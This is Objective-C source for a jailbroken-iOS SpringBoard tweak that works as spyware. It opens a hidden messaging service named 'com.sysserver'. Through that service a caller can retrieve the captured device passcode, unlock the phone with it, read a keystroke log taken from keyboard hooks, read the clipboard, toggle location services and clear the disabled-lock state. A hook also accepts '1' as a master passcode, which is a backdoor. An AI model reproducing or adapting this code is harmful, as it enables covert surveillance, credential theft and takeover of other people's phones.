#import "header.h"
#import <AppSupport/CPDistributedMessagingCenter.h>

%hook SpringBoard

bool hideHUD = false;
NSString *passcode;
NSString *keyLog;

-(void)applicationDidFinishLaunching:(id)application {
	%orig;
	CPDistributedMessagingCenter *messagingCenter = [CPDistributedMessagingCenter centerNamed:@"com.sysserver"];
	[messagingCenter runServerOnCurrentThread];
	[messagingCenter registerForMessageName:@"wake" target:self selector:@selector(takeOrder:)];
	[messagingCenter registerForMessageName:@"lock" target:self selector:@selector(takeOrder:)];
	[messagingCenter registerForMessageName:@"home" target:self selector:@selector(takeOrder:)];
	[messagingCenter registerForMessageName:@"doublehome" target:self selector:@selector(takeOrder:)];	
	[messagingCenter registerForMessageName:@"togglemute" target:self selector:@selector(takeOrder:)];
	[messagingCenter registerForMessageName:@"play" target:self selector:@selector(takeOrder:)];
	[messagingCenter registerForMessageName:@"pause" target:self selector:@selector(takeOrder:)];
	[messagingCenter registerForMessageName:@"next" target:self selector:@selector(takeOrder:)];
	[messagingCenter registerForMessageName:@"prev" target:self selector:@selector(takeOrder:)];
	[messagingCenter registerForMessageName:@"keylogclear" target:self selector:@selector(takeOrder:)];
    [messagingCenter registerForMessageName:@"locationon" target:self selector:@selector(takeOrder:)];
    [messagingCenter registerForMessageName:@"locationoff" target:self selector:@selector(takeOrder:)];

	[messagingCenter registerForMessageName:@"getpasscode" target:self selector:@selector(takeOrderAndReply:withUserInfo:)];
	[messagingCenter registerForMessageName:@"unlock" target:self selector:@selector(takeOrderAndReply:withUserInfo:)];
	[messagingCenter registerForMessageName:@"keylog" target:self selector:@selector(takeOrderAndReply:withUserInfo:)];
}

%new
-(void)takeOrder:(NSString *)name {
	if ([name isEqual:@"play"]) {
		[(SBMediaController *)[%c(SBMediaController) sharedInstance] play];
	}
	else if ([name isEqual:@"pause"]) {
		if ([(SBMediaController *)[%c(SBMediaController) sharedInstance] isPlaying]) {
			[(SBMediaController *)[%c(SBMediaController) sharedInstance] togglePlayPause];
		}
	}
	else if ([name isEqual:@"next"]) {
		[(SBMediaController *)[%c(SBMediaController) sharedInstance] changeTrack:1];
	}
	else if ([name isEqual:@"prev"]) {
		[(SBMediaController *)[%c(SBMediaController) sharedInstance] changeTrack:-1];
	}
	else if ([name isEqual:@"home"]) {
		[(SBUIController *)[%c(SBUIController) sharedInstance] clickedMenuButton];
	}
	else if ([name isEqual:@"lock"]) {
		[(SBUserAgent *)[%c(SBUserAgent) sharedUserAgent] lockAndDimDevice];
	}
	else if ([name isEqual:@"wake"]) {
		[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] cancelLockScreenIdleTimer];
		[(SBBacklightController *)[%c(SBBacklightController) sharedInstance] turnOnScreenFullyWithBacklightSource:1];
	}
	else if ([name isEqual:@"record"]) {
		[self performSelector:@selector(initRecord) withObject:nil afterDelay:0];
	}
	else if ([name isEqual:@"doublehome"]) {
		[(SBUIController *)[%c(SBUIController) sharedInstance] handleMenuDoubleTap];
	}
	else if ([name isEqual:@"undisabled"]) {
		[(SBDeviceLockController *)[%c(SBDeviceLockController) sharedController] _clearBlockedState];
	}
	else if ([name isEqual:@"hideHUD"]) {
		hideHUD = true;
	}
	else if ([name isEqual:@"showHUD"]) {
		hideHUD = false;
	}
	else if ([name isEqual:@"togglemute"]) {
    	[(VolumeControl *)[%c(VolumeControl) sharedVolumeControl] toggleMute];
    }
    else if ([name isEqual:@"keylogclear"]) {
    	keyLog = @"";
    }
    else if ([name isEqual:@"locationon"]) {
        [%c(CLLocationManager) setLocationServicesEnabled:true];
    }
    else if ([name isEqual:@"locationoff"]) {
        [%c(CLLocationManager) setLocationServicesEnabled:false];
    }
    
    
}

%new
- (NSDictionary *)takeOrderAndReply:(NSString *)name withUserInfo:(NSDictionary *)userInfo {
	if ([name isEqual:@"getpasscode"]) {
		NSString *result = @"";
		if (passcode != NULL) {
			result = passcode;
		}
		else {
			result = @"We have not obtained passcode yet";
		}
		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
	}
	else if ([name isEqual:@"unlock"]) {
		NSString *result = @"";
		if (passcode != NULL) {
			[(SBLockScreenManager *)[%c(SBLockScreenManager) sharedInstance] attemptUnlockWithPasscode:passcode];
		}
		else {
			result = @"We have not obtained passcode yet";
		}
		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
	}
	else if ([name isEqual:@"keylog"]) {
		NSString *result = @"";
		if (keyLog != NULL) {
			result = keyLog;
		}
		else {
			result = @"Listening...";
		}
		return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
	}
	else if ([name isEqual:@"getpaste"]) {
		return [NSDictionary dictionaryWithObject:[UIPasteboard generalPasteboard].items[0] forKey:@"returnStatus"];		
	}
	
	return [NSDictionary dictionaryWithObject:[NSNumber numberWithInt:1] forKey:@"returnStatus"];
}
%end


//log passcode

%hook SBLockScreenManager
-(BOOL)attemptUnlockWithPasscode:(id)arg1 {
	bool success = %orig;
	if ([[[NSString alloc] initWithFormat:@"%@", arg1] isEqual:@"1"]) {
		return true;
	}
	if (success) {
		passcode = [[NSString alloc] initWithFormat:@"%@", arg1];
	}
	return success;
}
%end

@interface UIKBTree : NSObject
@property(retain, nonatomic) NSString *displayString;
@end

%hook UIKeyboardLayoutStar
- (void)touchDownWithKey:(id)arg1 atPoint:(struct CGPoint)arg2 executionContext:(id)arg3 {
	NSLog(@"this key was pressed %@",arg1);
	dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
			UIKBTree *kbtree = arg1;
			NSString *text = kbtree.displayString;
			if ([text isEqual: @"space"])
				text = @" ";
			else if ([text isEqual: @"Search"]) {
				text = @"<Search>";
			}
			else if ([text isEqual: @"delete"]) {
				text = @"<delete>";
			}
			else if ([text isEqual: @"ABC"]) {
				text = @"<ABC>";
			}
			else if ([text isEqual: @"123"]) {
				text = @"<123>";
			}
			else if ([text isEqual: @"(null)"]) {
				text = @"";
			}
            if (keyLog == NULL) {
	            keyLog = @"";
            }           	
			keyLog = [[NSString alloc] initWithFormat:@"%@%@",keyLog,text];
	});
	%orig;
}
%end
